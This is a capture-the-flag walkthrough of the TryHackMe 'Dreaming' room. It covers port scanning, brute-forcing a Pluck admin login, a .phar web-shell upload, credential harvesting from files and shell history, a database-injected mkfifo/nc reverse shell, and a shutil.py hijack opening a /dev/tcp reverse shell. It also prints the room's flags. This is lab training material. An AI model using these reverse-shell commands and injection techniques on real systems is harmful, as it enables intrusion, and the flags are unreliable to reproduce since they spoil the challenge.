- - - 
created : 23-07-2025 

Tags : #easy 
- - - 
# Objective

While the king of dreams was imprisoned, his home fell into ruins.  

Can you help Sandman restore his kingdom?
# Recon

## Rustscan - Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
└─$ rustscan -a dreaming.thm -- -A  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.8.38:22
Open 10.10.8.38:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```

# Enumeration

## HTTP (80)

### Gobuster

We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://dreaming.thm

/app                  (Status: 301) [Size: 310] [--> http://dreaming.thm/app/]

```

Let's visit the page and open the directory we find :

![Pasted image 20250723201842.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250723201842.png)

We click on `admin` :

![Pasted image 20250723201940.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250723201940.png)

Login page, that doesn't require a username.

## Caido 

We can use [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md) for password [Bruteforcing](../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md), we intercept and send to automate, select a wordlist and filter for lenght:

![Pasted image 20250723202608.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250723202608.png)

![Pasted image 20250723202702.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250723202702.png)

Easy, should have tried that.

Now we can login :

![Pasted image 20250723202839.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250723202839.png)

![Pasted image 20250723203028.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250723203028.png)
# Exploit

## Reverse Shell

We can upload a .phar shell and it will bypass both of the security filters (read CVE) :

![Pasted image 20250723205845.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250723205845.png)

Set up a listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and open the file on the [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.8.38] 33634
Linux ip-10-10-8-38 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 18:59:14 up 46 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Shell Stabilization

We can perform a [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) :

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-10-8-38:/$ export TERM=xterm
export TERM=xterm
www-data@ip-10-10-8-38:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                              
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1337
                               reset
www-data@ip-10-10-8-38:/$ 
```

Now we search for something :

```bash
www-data@ip-10-10-8-38:/$ cd opt
www-data@ip-10-10-8-38:/opt$ ls
getDreams.py  test.py
www-data@ip-10-10-8-38:/opt$ cat test.py
import requests

#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"
```
## SSH Access 

Let's try it on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with username `lucien` :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
└─$ ssh lucien@dreaming.thm 

lucien@ip-10-10-8-38:~$ cat lucien_flag.txt 
THM{TH3_L1BR4R14N}
```

Boom.

# Lateral Movement - Privilege Escalation

## Lucien to Death

We can start with [Lateral Movement](../../3%20-%20Tags/Hacking%20Concepts/Lateral%20Movement.md) checking permissions :

```bash
lucien@ip-10-10-8-38:/$ sudo -l
Matching Defaults entries for lucien on ip-10-10-8-38:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lucien may run the following commands on ip-10-10-8-38:
    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py

```

We can try it :

```bash
lucien@ip-10-10-137-212:/home$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
Alice + Flying in the sky

Bob + Exploring ancient ruins

Carol + Becoming a successful entrepreneur

Dave + Becoming a professional musician

```

We find the same script in /opt, but password is redacted for death, let's retrieve mysql credentials for lucien and use them to connect to the database and add fake entries in the `dreamer` and/or `dream` columns that will be executed by the `getDreams.py` script :

```bash
lucien@ip-10-10-137-212:~$ cat .bash_history 
ls
cd /etc/ssh/
clear
nano sshd_config
su root
cd ..
ls
cd ..
cd etc
ls
..
cd ..
cd usr
cd lib
cd python3.8
nano shutil.py 
clear
clear
su root
cd ~~
cd ~
clear
ls
mysql -u lucien -plucien42DBPASSWORD

```

We have the password :

```bash
ucien@ip-10-10-137-212:~$ mysql -u lucien -plucien42DBPASSWORD
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use library
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> I
+-------------------+
| Tables_in_library |
+-------------------+
| dreams            |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from dreams;
+---------+------------------------------------+
| dreamer | dream                              |
+---------+------------------------------------+
| Alice   | Flying in the sky                  |
| Bob     | Exploring ancient ruins            |
| Carol   | Becoming a successful entrepreneur |
| Dave    | Becoming a professional musician   |
+---------+------------------------------------+
4 rows in set (0.00 sec)

mysql> desc dreams;
+---------+--------------+------+-----+---------+-------+
| Field   | Type         | Null | Key | Default | Extra |
+---------+--------------+------+-----+---------+-------+
| dreamer | varchar(50)  | YES  |     | NULL    |       |
| dream   | varchar(255) | YES  |     | NULL    |       |
+---------+--------------+------+-----+---------+-------+
2 rows in set (0.00 sec)

 mysql> INSERT INTO dreams (dreamer, dream)
    -> VALUES ('NoBody', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.162.183 1337 >/tmp/f)');


mysql> select * from dreams;
+---------+-----------------------------------------------------------+
| dreamer | dream                                                     |
+---------+-----------------------------------------------------------+
| Alice   | Flying in the sky                                         |
| Bob     | Exploring ancient ruins                                   |
| Carol   | Becoming a successful entrepreneur                        |
| Dave    | Becoming a professional musician                          |
| NoBody  | $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.162.183 1337 >/tmp/f) |
+---------+-----------------------------------------------------------+
5 rows in set (0.00 sec)

```

We setup a listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and try to execute getDreams.py again :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.83.170] 44354
$ whoami
death
$ ls
death_flag.txt
getDreams.py
$ cat death_flag.txt
THM{1M_TH3R3_4_TH3M}
```

We have a [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) as death.

## Death to Morpheus

Now we have to modify the `shutil` lib of [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) to get a Morpheus [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) :

`echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/10.8.162.183/4444 0>&1'\")" > /usr/lib/python3.8/shutil.py`

Wait morpheus to launch restore.py & got the [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) :

```bash
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.83.170] 47820
bash: cannot set terminal process group (1546): Inappropriate ioctl for device
bash: no job control in this shell
morpheus@ip-10-10-83-170:~$ cat morpheus_flag.txt
cat morpheus_flag.txt
THM{DR34MS_5H4P3_TH3_W0RLD}
```

Pwned .